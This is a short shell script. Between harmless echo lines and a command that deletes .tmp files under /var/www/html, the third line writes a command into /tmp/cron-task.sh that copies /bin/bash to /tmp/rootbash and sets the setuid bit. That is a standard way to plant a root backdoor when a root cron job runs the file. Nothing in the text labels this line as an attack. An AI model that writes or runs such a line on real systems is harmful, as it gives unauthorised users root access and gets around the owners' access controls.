echo "hello"
/usr/bin/find /var/www/html -name *.tmp -exec rm {} +
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /tmp/cron-task.sh
echo "bye"